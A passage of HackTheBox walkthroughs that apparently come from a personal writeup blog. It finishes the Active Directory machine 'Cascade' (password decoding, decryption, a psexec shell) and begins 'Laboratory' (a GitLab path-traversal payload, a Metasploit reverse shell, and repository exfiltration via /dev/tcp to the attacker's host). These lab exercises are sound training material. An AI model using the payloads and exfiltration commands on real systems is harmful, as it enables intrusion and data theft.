Servers] rid:[0x231] group:[Users] rid:[0x221] group:[Guests] rid:[0x222] group:[Remote Desktop Users] rid:[0x22b] group:[Network Configuration Operators] rid:[0x22c] group:[Performance Monitor Users] rid:[0x22e] group:[Performance Log Users] rid:[0x22f] group:[Distributed COM Users] rid:[0x232] group:[IIS_IUSRS] rid:[0x238] group:[Cryptographic Operators] rid:[0x239] group:[Event Log Readers] rid:[0x23d] group:[Certificate Service DCOM Access] rid:[0x23e] Domain group enumeration\nrpcclient $\u0026gt; enumalsgroups domain group:[Cert Publishers] rid:[0x205] group:[RAS and IAS Servers] rid:[0x229] group:[Allowed RODC Password Replication Group] rid:[0x23b] group:[Denied RODC Password Replication Group] rid:[0x23c] group:[DnsAdmins] rid:[0x44e] group:[IT] rid:[0x459] group:[Production] rid:[0x45a] group:[HR] rid:[0x45b] group:[AD Recycle Bin] rid:[0x45f] group:[Backup] rid:[0x460] group:[Temps] rid:[0x463] group:[WinRMRemoteWMIUsers__] rid:[0x465] group:[Remote Management Users] rid:[0x466] group:[Factory] rid:[0x46c] group:[Finance] rid:[0x46d] group:[Audit Share] rid:[0x471] group:[Data Share] rid:[0x472] List group members:\nMembers of IT group (rid:0x459)\nrpcclient $\u0026gt; queryaliasmem domain 0x459 sid:[S-1–5–21–3332504370–1206983947–1165150453–1106] sid:[S-1–5–21–3332504370–1206983947–1165150453–1107] sid:[S-1–5–21–3332504370–1206983947–1165150453–1109] rpcclient $\u0026gt; lookupsids S-1–5–21–3332504370–1206983947–1165150453–1106 S-1–5–21–3332504370–1206983947–1165150453–1106 CASCADE\\arksvc (1) rpcclient $\u0026gt; lookupsids S-1–5–21–3332504370–1206983947–1165150453–1107 S-1–5–21–3332504370–1206983947–1165150453–1107 CASCADE\\s.smith (1) rpcclient $\u0026gt; lookupsids S-1–5–21–3332504370–1206983947–1165150453–1109 S-1–5–21–3332504370–1206983947–1165150453–1109 CASCADE\\r.thompson (1) Members of Remote Management Users group (rid:0x466)\nrpcclient $\u0026gt; queryaliasmem domain 0x466 sid:[S-1–5–21–3332504370–1206983947–1165150453–1106] sid:[S-1–5–21–3332504370–1206983947–1165150453–1107] rpcclient $\u0026gt; lookupsids S-1–5–21–3332504370–1206983947–1165150453–1106 S-1–5–21–3332504370–1206983947–1165150453–1106 CASCADE\\arksvc (1) rpcclient $\u0026gt; lookupsids S-1–5–21–3332504370–1206983947–1165150453–1107 S-1–5–21–3332504370–1206983947–1165150453–1107 CASCADE\\s.smith (1) Member of AD Recycle Bin\nrpcclient $\u0026gt; queryaliasmem domain 0x45f sid:[S-1–5–21–3332504370–1206983947–1165150453–1106] rpcclient $\u0026gt; lookupsids S-1–5–21–3332504370–1206983947–1165150453–1106 S-1–5–21–3332504370–1206983947–1165150453–1106 CASCADE\\arksvc (1) Members of HR (rid:0x45b)\nrpcclient $\u0026gt; queryaliasmem domain 0x45b sid:[S-1–5–21–3332504370–1206983947–1165150453–1121] Members of Audit group (rid:0x471)\nrpcclient $\u0026gt; queryaliasmem domain 0x471 sid:[S-1–5–21–3332504370–1206983947–1165150453–1107] rpcclient $\u0026gt; lookupsids S-1–5–21–3332504370–1206983947–1165150453–1107 S-1–5–21–3332504370–1206983947–1165150453–1107 CASCADE\\s.smith (1) Members of Data share group (rid:0x472)\nrpcclient $\u0026gt; queryaliasmem domain 0x472 sid:[S-1–5–21–3332504370–1206983947–1165150453–513] rpcclient $\u0026gt; lookupsids S-1–5–21–3332504370–1206983947–1165150453–513 S-1–5–21–3332504370–1206983947–1165150453–513 CASCADE\\Domain Users (2) After enough digging, I did a password spray with a pattern of “username%username”, but no luck.\nBefore moving on, I\u0026rsquo;ll note the Remote Management Users group members:\n arksvc s.smith  TCP 389 - LDAP In LDAP, anonymous login are also allowed.\n→ root@iamf «cascade» «192.168.43.234» $ ldapsearch -h \u0026#39;10.10.10.182\u0026#39; -x -b \u0026#34;dc=cascade,dc=local\u0026#34; \u0026gt; ldap-enum  Nmap already identifies the Active Directory domain name as cascade.local. Because AD is basically based on the LDAP protocol, in LDAP form or known as a distinguished name, the AD domain usually follows \u0026ldquo;DC=NAME,DC=TLD\u0026rdquo;.\n cascade = NAME local = TLD (Top-Level Domain)   While examining the output from ldap-enum, I spotted an interesting line from user Ryan Thompson.\n...\u0026lt;snip\u0026gt;... displayName: Ryan Thompson uSNCreated: 24610 memberOf: CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local uSNChanged: 295010 name: Ryan Thompson ...\u0026lt;snip\u0026gt;... logonCount: 2 sAMAccountName: r.thompson sAMAccountType: 805306368 userPrincipalName: r.thompson@cascade.local objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local ...\u0026lt;snip\u0026gt;... lastLogonTimestamp: 132294360317419816 msDS-SupportedEncryptionTypes: 0 cascadeLegacyPwd: clk0bjVldmE= The cascadeLegacyPwd: clk0bjVldmE= line only appears on Ryan Thompson section and it can be decoded into rY4n5eva.\n→ root@iamf «cascade» «192.168.43.234» $ echo clk0bjVldmE= | base64 -d rY4n5eva I\u0026rsquo;ll mark the accounts that have a logonCount value greater than one:\n  Access as r.thompson It turns out that the decoded cascadeLegacyPwd is r.thompson \u0026rsquo;s password.\nWith r.thompson creds, I can see all the available shares.\n→ root@iamf «cascade» «192.168.43.234» $ crackmapexec smb cascade.htb -u r.thompson -p \u0026#39;rY4n5eva\u0026#39; --shares  Data share In Data shares, r.thompson is only allowed to read IT folder. I\u0026rsquo;ll pull all the files from the IT folder using smbget.\n Recall enumeration via RPC, r.thompson is a member of the IT group.\n → root@iamf «cascade» «192.168.43.234» $ smbget -R smb://cascade.htb/Data/IT/ -U r.thompson Here is the directory structure. I\u0026rsquo;ll take a look on Meeting_Notes_June_2018.html\n→ root@iamf «Data» «192.168.43.234» $ tree . └── IT ├── Email Archives │ └── Meeting_Notes_June_2018.html ├── LogonAudit ├── Logs │ ├── Ark AD Recycle Bin │ │ └── ArkAdRecycleBin.log │ └── DCs │ └── dcdiag.log └── Temp ├── r.thompson └── s.smith └── VNC Install.reg 9 directories, 4 files I can read the Meeting_Notes_June_2018.html\u0026rsquo;s content using browser. I drew a red line to indicate something important.\n The second interesting file is VNC Install.reg. It contains a stored password which can be decrypted according to this GitHub (https://github.com/frizb/PasswordDecrypts)\n□□Windows Registry Editor Version 5.00 [HKEY_LOCAL_MACHINE\\SOFTWARE\\TightVNC] [HKEY_LOCAL_MACHINE\\SOFTWARE\\TightVNC\\Server] ...\u0026lt;snip\u0026gt;... \u0026#34;Password\u0026#34;=hex:6b,cf,2a,4b,6e,5a,ca,0f ...\u0026lt;snip\u0026gt;... The third interesting file is ArkAdRecycleBin.log. It looks like a log from a custom application. I\u0026rsquo;ll take note on \u0026ldquo;Moving object to AD recycle bin CN=TempAdmin\u0026rdquo; part.\n1/10/2018 15:43 [MAIN_THREAD] ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 ** 1/10/2018 15:43 [MAIN_THREAD] Validating settings... 1/10/2018 15:43 [MAIN_THREAD] Error: Access is denied 1/10/2018 15:43 [MAIN_THREAD] Exiting with error code 5 2/10/2018 15:56 [MAIN_THREAD] ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 ** 2/10/2018 15:56 [MAIN_THREAD] Validating settings... 2/10/2018 15:56 [MAIN_THREAD] Running as user CASCADE\\ArkSvc 2/10/2018 15:56 [MAIN_THREAD] Moving object to AD recycle bin CN=Test,OU=Users,OU=UK,DC=cascade,DC=local 2/10/2018 15:56 [MAIN_THREAD] Successfully moved object. New location CN=Test\\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Deleted Objects,DC=cascade,DC=local 2/10/2018 15:56 [MAIN_THREAD] Exiting with error code 0 8/12/2018 12:22 [MAIN_THREAD] ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 ** 8/12/2018 12:22 [MAIN_THREAD] Validating settings... 8/12/2018 12:22 [MAIN_THREAD] Running as user CASCADE\\ArkSvc 8/12/2018 12:22 [MAIN_THREAD] Moving object to AD recycle bin CN=TempAdmin,OU=Users,OU=UK,DC=cascade,DC=local 8/12/2018 12:22 [MAIN_THREAD] Successfully moved object. New location CN=TempAdmin\\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local 8/12/2018 12:22 [MAIN_THREAD] Exiting with error code 0 As for dcdiag.log, up until now, I had no idea what that log was about.\nFoothold Shell as s.smith Decrypt VNC Password The VNC password can be decrypted using metasploit irb (interactive ruby).\n\u0026gt;\u0026gt; fixedkey = \u0026#34;\\x17\\x52\\x6b\\x06\\x23\\x4e\\x58\\x07\u0026#34; =\u0026gt; \u0026#34;\\x17Rk\\x06#NX\\a\u0026#34; \u0026gt;\u0026gt; require \u0026#39;rex/proto/rfb\u0026#39; =\u0026gt; true \u0026gt;\u0026gt; Rex::Proto::RFB::Cipher.decrypt [\u0026#34;6BCF2A4B6E5ACA0f\u0026#34;].pack(\u0026#39;H*\u0026#39;), fixedkey =\u0026gt; \u0026#34;sT333ve2\u0026#34;  Since it was discovered in s.smith\u0026rsquo;s folder, I may try this decrypted password on user s.smith.\nRemote Access From RPC enumeration, I already knew that user s.smith is a member of Remote Management Users, so I could try it with evil-winrm and it works.\n→ root@iamf «Data» «192.168.43.234» $ evil-winrm -i cascade.htb -u s.smith -p \u0026#39;sT333ve2\u0026#39; I can grab user flag.\nPrivilege Escalation Shell as arksvc Audit$ share After enumerating s.smith\u0026rsquo;s privileges and groups, CASCADE\\Audit Share reminds me to the Audit$ share, to which I previously had no access.\n I have read permissions now on Audit$.\n This share appears to contain an entire software application.\n→ root@iamf «Data» «192.168.43.234» $ smbclient -U s.smith \\\\\\\\cascade.htb\\\\Audit$  I\u0026rsquo;ll pull them all from Cascade to my Kali\n→ root@iamf «Data» «192.168.43.234» $ smbget -R smb://cascade.htb/Audit$ -U s.smith  And then send them over to my Windows.\n→ root@iamf «Audit$» «192.168.43.234» $ tree . ├── CascAudit.exe ├── CascCrypto.dll ├── DB │ └── Audit.db ├── RunAudit.bat ├── System.Data.SQLite.dll ├── System.Data.SQLite.EF6.dll ├── x64 │ └── SQLite.Interop.dll └── x86 └── SQLite.Interop.dll 3 directories, 8 files → root@iamf «Audit$» «192.168.43.234» $ file CascAudit.exe CascAudit.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows Analyzing Audit.db Audit.db is an SQlite3 database. As I\u0026rsquo;m analyzing on my Windows without SQLite installed, I\u0026rsquo;ll use an online SQLite viewer.\nThere are four tables in the database.\nThe records of the deleted AD object are kept in the DeletedUserAudit table.\nThe Ldap table contains the credentials for ArkSvc.\nThe password is not a simple base64 encoded string, but it is encrypted.\n→ root@iamf «Audit$» «192.168.43.234» $ echo \u0026#39;BQO5l5Kj9MdErXx6Q6AGOw==\u0026#39; | base64 -d ♣♥□□□□□□D□|zC□♠;# Analyzing CascAudit.exe I tried to run the program on my PC, but it produced the following errors.\n  Don\u0026rsquo;t run an untrusted binary you downloaded from a CTF box.\n I use a tool called dnSpy to reverse CascAudit.exe.\nOnce it is loaded, I\u0026rsquo;ll go straight to the main function.\npublic static void Main() { if (MyProject.Application.CommandLineArgs.Count != 1) { Console.WriteLine(\u0026#34;Invalid number of command line args specified. Must specify database path only\u0026#34;); return; } ...\u0026lt;snip\u0026gt;... try { sqliteConnection.Open(); using (SQLiteCommand sqliteCommand = new SQLiteCommand(\u0026#34;SELECT * FROM LDAP\u0026#34;, sqliteConnection)) { using (SQLiteDataReader sqliteDataReader = sqliteCommand.ExecuteReader()) { sqliteDataReader.Read(); str = Conversions.ToString(sqliteDataReader[\u0026#34;Uname\u0026#34;]); str2 = Conversions.ToString(sqliteDataReader[\u0026#34;Domain\u0026#34;]); string encryptedString = Conversions.ToString(sqliteDataReader[\u0026#34;Pwd\u0026#34;]); try { password = Crypto.DecryptString(encryptedString, \u0026#34;c4scadek3y654321\u0026#34;); } catch (Exception ex) { Console.WriteLine(\u0026#34;Error decrypting password: \u0026#34; + ex.Message); return; } } } sqliteConnection.Close(); } ...\u0026lt;snip\u0026gt;... Let\u0026rsquo;s break it down.\nIn order for the program to run properly, I need to specify the database path as its first argument.\n...\u0026lt;snip\u0026gt;... if (MyProject.Application.CommandLineArgs.Count != 1) { Console.WriteLine(\u0026#34;Invalid number of command line args specified. Must specify database path only\u0026#34;); return; } ...\u0026lt;snip\u0026gt;... If the condition above is satisfied, it opens an SQL connection and fetches all data from the Ldap table. Each of them is then stored to str, str2, and password.\n...\u0026lt;snip\u0026gt;... sqliteConnection.Open(); using (SQLiteCommand sqliteCommand = new SQLiteCommand(\u0026#34;SELECT * FROM LDAP\u0026#34;, sqliteConnection)) { using (SQLiteDataReader sqliteDataReader = sqliteCommand.ExecuteReader()) { sqliteDataReader.Read(); str = Conversions.ToString(sqliteDataReader[\u0026#34;Uname\u0026#34;]); str2 = Conversions.ToString(sqliteDataReader[\u0026#34;Domain\u0026#34;]); string encryptedString = Conversions.ToString(sqliteDataReader[\u0026#34;Pwd\u0026#34;]); try { password = Crypto.DecryptString(encryptedString, \u0026#34;c4scadek3y654321\u0026#34;); } ...\u0026lt;snip\u0026gt;... The interesting part in the code above is, of course, the password decrypt line. Now because I only need the decrypt function, I could remove all the codes and put only this line below on the main function and then print it out using Console.Write().\npassword = Crypto.DecryptString(encryptedString, \u0026#34;c4scadek3y654321\u0026#34;); Decrypt Password First, I\u0026rsquo;ll enter edit mode on the current main function\n Then, I could only use the decrypt function in the main function. So the main function code now looks like this.\n I\u0026rsquo;ll save it as a new program called CascAuditModified.exe.\n Now if I run it, I get the decrypted password.\n┌─「iamf@MSI」 ‣ 「/mnt/z/Shared/Audit$」 ᓚᘏᗢ [172.17.146.164] └─╼$ ./CascAuditModified.exe w3lc0meFr31nd  Remote Access - Arksvc From my RPC enumeration, ArkSvc is a member of Remote Management Users, so I can use it with evil-winrm.\n→ root@iamf «Data» «192.168.43.234» $ evil-winrm -i cascade.htb -u arksvc -p \u0026#39;w3lc0meFr31nd\u0026#39; Evil-WinRM shell v2.3 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\arksvc\\Documents\u0026gt; Shell as NT Authority\\System Enumeration I\u0026rsquo;ll wrap it up:\nFirst, recall from RPC enumeration that user ArkSvc is also a member of AD Recycle Bin. The AD Recycle Bin group gives you permission to read deleted AD objects.\nSecond, according to the email sent by Steve Smith, there is a temporary admin account called TempAdmin that uses the same password as the \u0026ldquo;normal\u0026rdquo; admin account.\n But, based on ArkAdRecycleBin.log, TempAdmin has been moved into AD Recycle Bin.\n...\u0026lt;snip\u0026gt;... 8/12/2018 12:22 [MAIN_THREAD] Running as user CASCADE\\ArkSvc 8/12/2018 12:22 [MAIN_THREAD] Moving object to AD recycle bin CN=TempAdmin,OU=Users,OU=UK,DC=cascade,DC=local 8/12/2018 12:22 [MAIN_THREAD] Successfully moved object. New location CN=TempAdmin\\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local 8/12/2018 12:22 [MAIN_THREAD] Exiting with error code 0 And now using ArksSvc account, I can search all the deleted objects using the command below:\n*Evil-WinRM* PS C:\\Users\\arksvc\\Documents\u0026gt; Get-ADObject -filter \u0026#39;isDeleted -eq $true\u0026#39; -includeDeletedObjects -Properties * -includeDeletedObjects -SearchBase \u0026#34;DC=cascade,DC=local\u0026#34; After looking through the output, I noticed that TempAdmin has one interesting properties. It is another cascadeLegacyPwd.\nI can decode the value to plaintext\n→ root@iamf «Data» «192.168.43.234» $ echo \u0026#39;YmFDVDNyMWFOMDBkbGVz\u0026#39; | base64 -d baCT3r1aN00dles TempAdmin:baCT3r1aN00dles\nRemote Access - NT Authority\\System The password works on the Administrator account, and I can obtain an interactive shell as NT Authority\\System using psexec.py.\n→ root@iamf «Data» «192.168.43.234» $ psexec.py cascade.local/administrator:\u0026#39;baCT3r1aN00dles\u0026#39;@cascade.htb   References  https://book.hacktricks.xyz/windows/active-directory-methodology/privileged-accounts-and-token-privileges#ad-recycle-bin  ","permalink":"https://fahmifj.github.io/writeups/hackthebox/htb-cascade/","summary":"Cascade is another fun Windows machine with Medium difficulty from HackTheBox created by VbScrub, the creator of Nest. It starts with by enumerating LDAP to find a custom LDAP attribute on one of the users to gain initial access to SMB shares. Enumeration on SMB discovers VNC credentials that can be decrypted using IRB. The credentials can be used to gain a foothold on the system. Another enumeration on SMB with those credentials finds a set of custom application.","tags":["OSCP-plus","Windows","Active-Directory","Domain-controller","SMB","VNC",".NET","Reverse-engineering","AD-Recycle-Bin","rpcclient","psexec.py","evil-winrm"],"title":"HackTheBox - Cascade"},{"content":"Laboratory is an easy difficulty Linux machine from HackTheBox that features an instance of GitLab application in a docker container. The application is known to be vulnerable to an arbitrary file read that can be leveraged to read the application\u0026rsquo;s secret, allowing an attacker to craft his own malicious cookie and perform a de-serialization attack to gain a foothold on the container.\nEnumerating inside the container finds a private user repository that contains a pair of SSH keys. The keys allows me to logs into the machine. From there, I\u0026rsquo;m able to gain a foothold on the box using the SSH private key. There is an SUID binary that calls chmod with relative path, making it vulnerable to path hijacking.\nSkills Learned  Arbitrary File Read Metasploit Exploiting GitLab 12.8.1~12.9.0 Recover git repository SUID exploitation  Tools  Kali Linux (Attacking Machine) - https://www.kali.org/ Nmap - Preinstalled in Kali Linux searchsploit - Preinstalled in Kali Linux Metasploit - Preinstalled in Kali Linux CVE-2020-10997 Exploit PoC - https://github.com/thewhiteh4t/cve-2020-10977  Reconnaissance Nmap Initial scan with nmap shows 3 ports open, they are SSH on port 22, HTTP on port 80, and HTTPS on port 443.\n→ root@iamf «laboratory» «10.10.14.39» $ nmap -sC -sV -oA scans/10-initial-laboratory 10.10.10.216 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.41 | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Did not follow redirect to https://laboratory.htb/ 443/tcp open ssl/http Apache httpd 2.4.41 ((Ubuntu)) | http-methods: |_ Supported Methods: GET POST OPTIONS HEAD |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: The Laboratory | ssl-cert: Subject: commonName=laboratory.htb | Subject Alternative Name: DNS:git.laboratory.htb | Issuer: commonName=laboratory.htb | Public Key type: rsa | Public Key bits: 4096 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2020-07-05T10:39:28 | Not valid after: 2024-03-03T10:39:28 | MD5: 2873 91a5 5022 f323 4b95 df98 b61a eb6c |_SHA-1: 0875 3a7e eef6 8f50 0349 510d 9fbf abc3 c70a a1ca | tls-alpn: |_ http/1.1 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel From the scan above, visiting port 80 will be redirected to https://laboratory.htb.\nOn the HTTPS port, the certificate discloses a subdomain.\nFrom here, I\u0026rsquo;ll add laboratory.htb and git.laboratory.htb as well to /etc/hosts\n→ root@iamf «laboratory» «10.10.14.39» $ echo \u0026#39;10.10.10.216 laboratory.htb git.laboratory.htb\u0026#39; \u0026gt; /etc/hosts Enumeration TCP 80 - laboratory.htb There is nothing really interesting here.\n TCP 443 - git.laboratory.htb A GitLab instance is presented on this page.\n I tried to register an account, but GitLab rejected it by saying the email domain was not authorized.\n I changed my email to iamf@laboratory.htb and it works.\nThe first thing I do is to check the GitLab version. It is available on the “Help” section and the current version is 12.8.1.\n I found another user on this website named Dexter McPherson. This user has a project called SecureWebsite\n Searchsploit searchsploit shows several exploits for GitLab. One that stands out is an arbitrary file read vulnerability on version 12.9.0 which might work as well on version 12.8.1.\n→ root@iamf «laboratory» «10.10.14.39» $ searchsploit gitlab ------------------------------------------------------------------------- ----------------------------- Exploit Title | Path ------------------------------------------------------------------------- ----------------------------- GitLab - \u0026#39;impersonate\u0026#39; Feature Privilege Escalation | ruby/webapps/40236.txt GitLab 11.4.7 - RCE (Authenticated) (2) | ruby/webapps/49334.py GitLab 11.4.7 - Remote Code Execution (Authenticated) (1) | ruby/webapps/49257.py GitLab 12.9.0 - Arbitrary File Read | ruby/webapps/48431.txt Gitlab 12.9.0 - Arbitrary File Read (Authenticated) | ruby/webapps/49076.py Gitlab 6.0 - Persistent Cross-Site Scripting | php/webapps/30329.sh Gitlab-shell - Code Execution (Metasploit) | linux/remote/34362.rb Jenkins Gitlab Hook Plugin 1.4.2 - Reflected Cross-Site Scripting | java/webapps/47927.txt NPMJS gitlabhook 0.0.17 - \u0026#39;repository\u0026#39; Remote Command Execution | json/webapps/47420.txt ------------------------------------------------------------------------- ------------------------------ Foothold Shell as git GitLab CVE-2020-10977 - Manual  CVE-2020-10977: GitLab EE/CE 8.5 to 12.9 is vulnerable to a path traversal when moving an issue between projects.\n The arbitrary file read vulnerability is classified as CVE-2020–10977. The report can be found at Hackerone. The researcher also shows how that vulnerability can be turned into a remote code execution.\nI\u0026rsquo;ll reproduce the vulnerability by creating two projects. I\u0026rsquo;ll name it as \u0026ldquo;project1\u0026rdquo; and \u0026ldquo;project2\u0026rdquo;.\n After that I\u0026rsquo;ll create an issue on \u0026ldquo;project2\u0026rdquo; and fill the issue description with a payload as follows:\n![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd)  I\u0026rsquo;ll then move the issue on \u0026ldquo;project2\u0026rdquo; to \u0026ldquo;project1\u0026rdquo;\n The payload will then turn into an attached file.\n The attached file contains the content of /etc/passwd file from the system.\n GitLab CVE-2020-10977 - Automated There is also an automated version to exploit this vulnerability written in Python.\n→ root@iamf «laboratory» «10.10.14.39» $ python3 cve_2020_10977.py https://git.laboratory.htb/ iamf iamfiamf ...\u0026lt;SNIP\u0026gt;... [+] Target : https://git.laboratory.htb [+] Username : iamf [+] Password : iamfiamf [+] Project Names : ProjectOne, ProjectTwo [!] Trying to Login... [+] Login Successful! [!] Creating ProjectOne... [+] ProjectOne Created Successfully! [!] Creating ProjectTwo... [+] ProjectTwo Created Successfully! [\u0026gt;] Absolute Path to File : /etc/passwd [!] Creating an Issue... [+] Issue Created Successfully! [!] Moving Issue... [+] Issue Moved Successfully! [+] File URL : https://git.laboratory.htb/iamf/ProjectTwo/uploads/9335567cda468be5d53e6ddcca1412e4/passwd \u0026gt; /etc/passwd ---------------------------------------- ...\u0026lt;SNIP\u0026gt;... git:x:998:998::/var/opt/gitlab:/bin/sh gitlab-www:x:999:999::/var/opt/gitlab/nginx:/bin/false gitlab-redis:x:997:997::/var/opt/gitlab/redis:/bin/false gitlab-psql:x:996:996::/var/opt/gitlab/postgresql:/bin/sh mattermost:x:994:994::/var/opt/gitlab/mattermost:/bin/sh registry:x:993:993::/var/opt/gitlab/registry:/bin/sh gitlab-prometheus:x:992:992::/var/opt/gitlab/prometheus:/bin/sh gitlab-consul:x:991:991::/var/opt/gitlab/consul:/bin/sh ...\u0026lt;SNIP\u0026gt;... LFI to RCE To turns this arbitrary file read vulnerability into a remote code execution, I’ll need to setup my own GitLab instance with the same version as the one on Laboratory. Then I’ll have to replace my GitLab secret_key_base with the one on Laboratory (located on /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml). After that all is set, I\u0026rsquo;ve to craft my own cookie to get the code execution on the system.\nFortunately, there is a Metasploit module to perform this automatically, and I’ll use that.\nFirst, I’ll have to grab the module from GitHub and put it into /usr/share/metasploit-framework/modules/exploits/multi/http.\n→ root@iamf «laboratory» «10.10.14.39» $ cd /usr/share/metasploit-framework/modules/exploits/multi/http \u0026amp;\u0026amp; wget https://raw.githubusercontent.com/rapid7/metasploit-framework/master/modules/exploits/multi/http/gitlab_file_read_rce.rb After that I’ll re-initialize the metasploit database using msfdb.\n→ root@iamf «laboratory» «10.10.14.39» $ msfdb reinit [+] Starting database [+] Dropping databases \u0026#39;msf\u0026#39; [+] Dropping databases \u0026#39;msf_test\u0026#39; [+] Dropping database user \u0026#39;msf\u0026#39; [+] Deleting configuration file /usr/share/metasploit-framework/config/database.yml [+] Stopping database [+] Starting database [+] Creating database user \u0026#39;msf\u0026#39; [+] Creating databases \u0026#39;msf\u0026#39; [+] Creating databases \u0026#39;msf_test\u0026#39; [+] Creating configuration file \u0026#39;/usr/share/metasploit-framework/config/database.yml\u0026#39; [+] Creating initial database schema Now on Metasploit, I can use the module by issuing the command below:\nmsf6 \u0026gt; use exploit/multi/http/gitlab_file_read_rce [*] No payload configured, defaulting to generic/shell_reverse_tcp Below are the options needed by the module.\nmsf6 exploit(multi/http/gitlab_file_read_rce) \u0026gt; set USERNAME iamf USERNAME =\u0026gt; iamf msf6 exploit(multi/http/gitlab_file_read_rce) \u0026gt; set PASSWORD iamfiamf PASSWORD =\u0026gt; iamfiamf msf6 exploit(multi/http/gitlab_file_read_rce) \u0026gt; set RHOSTS 10.10.10.216 RHOSTS =\u0026gt; 10.10.10.216 msf6 exploit(multi/http/gitlab_file_read_rce) \u0026gt; set RPORT 443 RPORT =\u0026gt; 443 msf6 exploit(multi/http/gitlab_file_read_rce) \u0026gt; set SSL true [!] Changing the SSL option’s value may require changing RPORT! SSL =\u0026gt; true msf6 exploit(multi/http/gitlab_file_read_rce) \u0026gt; set VHOST git.laboratory.htb VHOST =\u0026gt; git.laboratory.htb msf6 exploit(multi/http/gitlab_file_read_rce) \u0026gt; set LHOST tun0 LHOST =\u0026gt; tun0 msf6 exploit(multi/http/gitlab_file_read_rce) \u0026gt; set LPORT 9001 LPORT =\u0026gt; 9001 After all the required options are set, I’ll start the exploit with the run command.\nmsf6 exploit(multi/http/gitlab_file_read_rce) \u0026gt; run [*] Started reverse TCP handler on 10.10.14.39:9001 [*] Executing automatic check (disable AutoCheck to override) [+] The target appears to be vulnerable. GitLab 12.8.1 is a vulnerable version. [*] Logged in to user iamf [*] Created project /iamf/hpt2TORA [*] Created project /iamf/ysGE0u0L [*] Created issue /iamf/hpt2TORA/issues/1 [*] Executing arbitrary file load [+] File saved as: \u0026#39;/root/.msf4/loot/20210321174611_default_10.10.10.216_gitlab.secrets_490542.txt\u0026#39; [+] Extracted secret_key_base 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3 [*] NOTE: Setting the SECRET_KEY_BASE option with the above value will skip this arbitrary file read [*] Attempting to delete project /iamf/hpt2TORA [*] Deleted project /iamf/hpt2TORA [*] Attempting to delete project /iamf/ysGE0u0L [*] Deleted project /iamf/ysGE0u0L [*] Command shell session 1 opened (10.10.14.39:9001 -\u0026gt; 10.10.10.216:52726) at 2021-03-21 17:46:14 -0400 id;hostname uid=998(git) gid=998(git) groups=998(git) git.laboratory.htb I have shell as user git.\nThere is a .dockerenv file in the root directory. This indicates that I\u0026rsquo;m inside a docker container.\nls -la / total 88 drwxr-xr-x 1 root root 4096 Jul 2 2020 . drwxr-xr-x 1 root root 4096 Jul 2 2020 .. -rwxr-xr-x 1 root root 0 Jul 2 2020 .dockerenv -rw-r--r-- 1 root root 157 Feb 24 2020 RELEASE drwxr-xr-x 2 root root 4096 Feb 24 2020 assets Privilege Escalation Shell as dexter Container enumeration Enumerating the git home directory (/var/opt/gitlab) discovers two repositories that belongs to user dexter.\ngit@git:~$ grep -Ri dexter 2\u0026gt;/dev/null git-data/repositories/@hashed/19/58/19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7.git/config: fullpath = dexter/securedocker git-data/repositories/@hashed/2c/62/2c624232cdd221771294dfbb310aca000a0df6ac8b66b696d90ef06fdefb64a3.git/config: fullpath = dexter/securewebsite I haven\u0026rsquo;t seen that dexter/securedocker before in the GitLab application. So I\u0026rsquo;ll grab that repository and transfer it to my machine\ngit@git:~/git-data/repositories/@hashed/19/58$ ls -la 19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7.git total 40 drwxr-s--- 6 git root 4096 Jul 5 2020 . drwxr-s--- 4 git root 4096 Jul 5 2020 .. -rw-r--r-- 1 git root 23 Jul 5 2020 HEAD -rw-r--r-- 1 git root 107 Jul 5 2020 config -rw-r--r-- 1 git root 73 Jul 5 2020 description drwxr-sr-x 2 git root 4096 Jul 5 2020 hooks drwxr-sr-x 2 git root 4096 Jul 5 2020 info -rw-r--r-- 1 git root 112 Jul 5 2020 language-stats.cache drwxr-sr-x 14 git root 4096 Jul 5 2020 objects drwxr-sr-x 4 git root 4096 Jul 5 2020 refs First, I’ll create a tarball archive of that repository and I’ll name it as exfil-securedocker-git.tar.\ngit@git:~/git-data/repositories/@hashed/19/58/$ tar -czf /tmp/exfil-securedocker-git.tar 19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7.git On my machine, I\u0026rsquo;ll setup a listener\n→ root@iamf «loot» «10.10.14.39» $ nc -nvlp 9000 \u0026gt; exfil-securedocker-git.tar Back on Laboratory, I’ll send the repository tarball to my machine using cat and bash trick\ngit@git:~/git-data/repositories/@hashed/19/58/$ cat /tmp/exfil-securedocker-git.tar \u0026gt; /dev/tcp/10.10.14.39/9000 My listener received the tarball.\n→ root@iamf «loot» «10.10.14.39» $ nc -nvlp 9000 \u0026gt; exfil-securedocker-git.tar listening on [any] 9000 ... connect to [10.10.14.39] from (UNKNOWN) [10.10.10.216] 42426 Recover \u0026lsquo;securedocker\u0026rsquo; repository After extracting the repository, I saw git:(master) pop up in my zsh prompt which indicates this is a git repository.\nBut, when I try to read the repository status, it returns an error message.\n→ root@iamf «loot» «10.10.14.39» $ tar -xzf exfil-securedocker-git.tar → root@iamf «loot» «10.10.14.39» $ cd 19581e27de7ced....5ef03f7c3017bb5b7.git → 